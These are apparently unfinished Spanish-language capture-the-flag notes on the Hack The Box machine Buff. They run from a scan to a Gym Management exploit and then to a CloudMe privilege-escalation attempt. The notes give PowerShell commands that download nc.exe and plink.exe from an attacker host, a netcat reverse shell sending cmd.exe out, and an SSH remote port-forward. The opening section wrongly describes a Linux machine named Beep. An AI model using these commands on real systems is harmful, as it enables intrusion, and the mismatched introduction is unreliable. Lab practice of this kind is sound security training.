 -- -
- Tags: #ejptmachine #gymmanagementsoftware #portforwarding #ncexe
-- --
### ¿Qué habilidades puedes practicar con Beep?

1. **Reconocimiento de servicios:**
    - Comienza con un **escaneo de puertos** con **Nmap** para identificar qué servicios están expuestos.
    - La máquina presenta un servicio web vulnerable, por lo que **enumerar directorios** en la aplicación web utilizando herramientas como **Gobuster** o **Dirbuster** será fundamental.
2. **Explotación de vulnerabilidades web:**
    - La máquina tiene una vulnerabilidad de **inyección SQL (SQLi)**, por lo que necesitarás investigar el sitio web y probar inyecciones SQL para ganar acceso a la máquina.
    - Además, podrás explorar cómo automatizar este proceso con herramientas como **sqlmap** y cómo hacerlo manualmente para profundizar en la explotación.
3. **Escalada de privilegios en Linux:**
    - Una vez que consigas acceso inicial al sistema, deberás realizar una **escalada de privilegios** en **Linux**. Esto puede incluir la búsqueda de archivos con configuraciones incorrectas o vulnerabilidades en las que puedas aprovecharte para ganar acceso root.

---

`nmap -p- --min-rate 5000 -sCV -Pn -n 10.10.10.198 -oN portScan`
![Pasted image 20241207210944](../../Fotos/Pasted%20image%2020241207210944.png)

![Pasted image 20241207211222](../../Fotos/Pasted%20image%2020241207211222.png)

`gobuster dir -u http://10.10.10.198:8080/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`
![Pasted image 20241207212101](../../Fotos/Pasted%20image%2020241207212101.png)

![Pasted image 20241207213451](../../Fotos/Pasted%20image%2020241207213451.png)
### Forma 1

`searchsploit Gym Management`
![Pasted image 20241207213608](../../Fotos/Pasted%20image%2020241207213608.png)

![Pasted image 20241208084340](../../Fotos/Pasted%20image%2020241208084340.png)

![Pasted image 20241208084444](../../Fotos/Pasted%20image%2020241208084444.png)

![Pasted image 20241208085113](../../Fotos/Pasted%20image%2020241208085113.png)

![Pasted image 20241208085143](../../Fotos/Pasted%20image%2020241208085143.png)

Leyendo el script vemos esto y probamos
![Pasted image 20241208095235](../../Fotos/Pasted%20image%2020241208095235.png)
![Pasted image 20241208095127](../../Fotos/Pasted%20image%2020241208095127.png)
![Pasted image 20241208095203](../../Fotos/Pasted%20image%2020241208095203.png)

![Pasted image 20241208090143](../../Fotos/Pasted%20image%2020241208090143.png)

La sesión es muy inestable y no nos permite movernos libremente por el sistema, podemos movernos solo de esta manera
![Pasted image 20241208094046](../../Fotos/Pasted%20image%2020241208094046.png)

user flag: 6426ca546aea08a2330a7387c7075084
`Maquina Vulnerada`

-----

*Obtener una powershell ya que estamos en una shell básica *
![Pasted image 20241208110701](../../Fotos/Pasted%20image%2020241208110701.png)
![Pasted image 20241208110926](../../Fotos/Pasted%20image%2020241208110926.png)
`powershell IWR -uri http://10.10.14.16:8000/nc.exe -OutFile C:\xampp\htdocs\gym\upload\nc.exe`
`nc.exe 10.10.14.16 4444 -e cmd.exe`
![Pasted image 20241208110845](../../Fotos/Pasted%20image%2020241208110845.png)
![Pasted image 20241208110931](../../Fotos/Pasted%20image%2020241208110931.png)
![Pasted image 20241208110954](../../Fotos/Pasted%20image%2020241208110954.png)

**Tenemos una powershell estable**

Otra vista a lo mismo
![Pasted image 20241208125413](../../Fotos/Pasted%20image%2020241208125413.png)

----

*Escalada de Privilegios*

**Pues no**, la maquina no tiene **Python** y no permite ejecutar scripts de **PowerShell** (hay un exploit también). Así que tenemos dos opciones, pasar algún script de **Python** a **.exe** y subirlo o hacer un _Remote Port Forwarding_. Me voy con la segunda opción. (La primera la intente pero me dio problemas)

En todos los exploits usan el puerto 8888, con ello entendemos que CloudMe se ejecuta en ese puerto. En nuestro escaneo no lo obtuvimos, veamos su estado. Si ejecutamos el binario y posteriormente validamos si el puerto está arriba vamos a verlo arriba

Investigando en internet vemos que esta version de cloudme es vulnerable a buffer overflow 
![Pasted image 20241208111240](../../Fotos/Pasted%20image%2020241208111240.png)
`netstat -a | findstr 8888`
![Pasted image 20241208112636](../../Fotos/Pasted%20image%2020241208112636.png)
- Al igual que nc.exe tenemos que cargar plink.exe
*Remote Port Forwarding*
`powershell IWR -uri http://10.10.14.16:8000/plink.exe -OutFile c:\Xampp\htdocs\gym\upload\plink.exe`
`plink.exe -l root -pw hola2 -R 8888:127.0.0.1:8888 10.10.14.16`
`plink.exe -l root -pw hola2 -P 177 -R 8888:127.0.0.1:8888 10.10.14.16`
![Pasted image 20241208131444](../../Fotos/Pasted%20image%2020241208131444.png)
- Perfecto, ya tenemos el puerto 8888 del localhost de la máquina 10.10.10.198 (BUFF) en nuestro equipo, lo siguiente es tomar algún exploit, crear el payload y ejecutarlo sobre nuestro localhost

*En caso de tener problemas con este paso: Acá tuve algunos problemas, ya que por alguna extraña razón (valide firewall, configuraciones, etc) no me permitía conectarme al puerto **22** (SSH), así que cambiando el puerto que estará en escucha si nos permite ejecutarlo.*
`/etc/ssh/sshd_config`
![Pasted image 20241208133941](../../Fotos/Pasted%20image%2020241208133941.png)

![Pasted image 20241231210208](../../Fotos/Pasted%20image%2020241231210208.png)

- Plink.exe cargado
![Pasted image 20241208140512](../../Fotos/Pasted%20image%2020241208140512.png)

reverse shell pendiente para terminar la escalada de privilegios....


SEGUIR INTENTANDO ESCALADA DE PRIVILEGIOS







